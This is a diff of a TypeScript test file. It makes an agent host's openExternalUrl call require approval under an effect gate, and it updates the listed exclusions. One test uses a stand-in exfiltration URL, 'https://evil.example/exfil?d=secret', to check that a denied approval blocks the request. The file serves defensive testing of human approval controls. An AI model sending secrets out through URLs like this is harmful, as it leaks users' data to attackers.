@@ -176,6 +176,45 @@ describe("enforceMutatingEffects — FLAG ON + foreground + write → approval A
   });
 });
 
+describe("enforceMutatingEffects — openExternalUrl is now GATED (moved out of the exclusions)", () => {
+  /** A hostApi exposing openExternalUrl as a real async write impl. */
+  function makeUrlApi(log: string[]) {
+    return {
+      openExternalUrl: async (_url: string): Promise<void> => {
+        log.push("open");
+      },
+    };
+  }
+
+  it("FLAG ON + foreground → asks at the effect-gate; DENY → the URL is NOT opened", async () => {
+    const log: string[] = [];
+    const { gate, requests } = makeGate("deny-once");
+    const api = enforceMutatingEffects(makeUrlApi(log), deps(gate, true));
+    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
+      await expect(api.openExternalUrl("https://evil.example/exfil?d=secret")).rejects.toBeInstanceOf(
+        EffectBoundaryDeniedError,
+      );
+    });
+    expect(requests).toHaveLength(1); // the effect-gate fired
+    expect(requests[0]).toMatchObject({
+      category: "agent-action",
+      args: { effect: "write", methodPath: "openExternalUrl", target: "https://evil.example" },
+    });
+    expect(log).toEqual([]); // DENY → the browser was never opened
+  });
+
+  it("FLAG OFF → byte-for-byte pass-through (no modal, URL opens)", async () => {
+    const log: string[] = [];
+    const { gate, requests } = makeGate("deny-once");
+    const api = enforceMutatingEffects(makeUrlApi(log), deps(gate, false));
+    await runWithEffectGateContext({ headless: false, toolName: "t" }, async () => {
+      await api.openExternalUrl("https://example.com");
+    });
+    expect(requests).toHaveLength(0);
+    expect(log).toEqual(["open"]);
+  });
+});
+
 describe("enforceMutatingEffects — reads never prompt", () => {
   it("a gated-namespace READ method passes through with no approval", async () => {
     const log: string[] = [];
@@ -348,7 +387,7 @@ describe("gateMutatingEffect — direct unit behaviour", () => {
 });
 
 describe("GATED_EFFECT_PATHS — SOT-derived async-only membership", () => {
-  it("contains the design's async write chokepoints and EXCLUDES the verb-derived hostFetch + sync writes", () => {
+  it("contains the design's async write chokepoints (incl. openExternalUrl) and EXCLUDES the verb-derived hostFetch + sync/circular writes", () => {
     for (const p of [
       "storage.write",
       "storage.writeJson",
@@ -361,11 +400,15 @@ describe("GATED_EFFECT_PATHS — SOT-derived async-only membership", () => {
       "spawnWorker",
       "triggerConversation",
       "agentApproval.request",
+      // openExternalUrl is now GATED (egress/exfil-class) — moved out of the
+      // exclusions; it is async so the await-based wrapper can gate it.
+      "openExternalUrl",
     ]) {
       expect(GATED_EFFECT_PATHS.has(p)).toBe(true);
     }
-    // hostFetch self-gates inline (verb-derived); these are sync / pre-exec-covered.
-    for (const p of ["hostFetch", "registerKeywords", "config.set", "openExternalUrl", "agentApproval.respond"]) {
+    // hostFetch self-gates inline (verb-derived); registerKeywords is sync;
+    // config.set / agentApproval.respond are the bounded-ungated exclusions.
+    for (const p of ["hostFetch", "registerKeywords", "config.set", "agentApproval.respond"]) {
       expect(GATED_EFFECT_PATHS.has(p)).toBe(false);
     }
   });
@@ -416,33 +459,37 @@ describe("MAJOR-1 — the gated set is SOT-DERIVED + FAIL-CLOSED (not hand-curat
       expect(reason, `exclusion ${path} must document a reason`).toBeTruthy();
       expect(reason.length).toBeGreaterThan(10);
     }
-    // the five deliberate exclusions
+    // the four deliberate exclusions (openExternalUrl was MOVED to the gated set)
     expect([...ENFORCEMENT_EXCLUSIONS.keys()].sort()).toEqual(
-      ["agentApproval.respond", "config.set", "hostFetch", "openExternalUrl", "registerKeywords"].sort(),
+      ["agentApproval.respond", "config.set", "hostFetch", "registerKeywords"].sort(),
     );
+    // openExternalUrl is NO LONGER an exclusion — it is effect-gated.
+    expect(ENFORCEMENT_EXCLUSIONS.has("openExternalUrl")).toBe(false);
   });
 });
 
-describe("MAJOR-2 — registerKeywords cannot become a silent fail-open read at the flip", () => {
+describe("MAJOR-2 — registerKeywords is a SYNC, BOUNDED-ungated exclusion (records a write, never a confirmed read)", () => {
   it("is an explicit exclusion AND is WRITE-classified + SYNC in the SOT", () => {
     // excluded from gating (it is SYNC — cannot await a modal)…
     expect(ENFORCEMENT_EXCLUSIONS.has("registerKeywords")).toBe(true);
     expect(GATED_EFFECT_PATHS.has("registerKeywords")).toBe(false);
     // …but still WRITE-classified, so the recorder marks any tool that calls it as
-    // mutating → Phase 4 never classifies that tool read → its pre-exec ask stays.
+    // mutating (never a confirmed read at the recorder). Under the relaxation flag
+    // it runs UNGATED, but is bounded (start-only, not reachable mid-tool.execute).
     expect(CHOKEPOINT_EFFECT.registerKeywords).toBe("write");
     // and it is SYNC (no `async` flag) — the structural reason it is excluded.
     expect(HOSTAPI_EFFECT_BY_PATH.registerKeywords.async).toBeUndefined();
   });
 
-  it("recording registerKeywords flips the ledger to mutating (Phase-4 keeps its pre-exec ask)", async () => {
+  it("recording registerKeywords flips the ledger to mutating (a write at the recorder, never a confirmed read)", async () => {
     const wrapped = instrumentEffectsByPath({ registerKeywords: (_kw: unknown): void => {} });
     const ledger: EffectLedger = createEffectLedger("cid-kw");
     await runWithEffectLedger(ledger, async () => {
       wrapped.registerKeywords([{ keyword: "k", skillId: "s" }]);
     });
-    // a tool that reaches registerKeywords records a WRITE → it is never a "read"
-    // tool → Phase 4 does not relax its pre-exec ask (the proof it is not fail-open).
+    // reaching registerKeywords records a WRITE → the recorder never sees it as a
+    // confirmed read. (The relaxation does not pre-classify read/write, so this is
+    // about the recorder's honesty, not about retaining a pre-exec ask.)
     expect(ledger.summary().hasMutatingEffect).toBe(true);
   });
 });
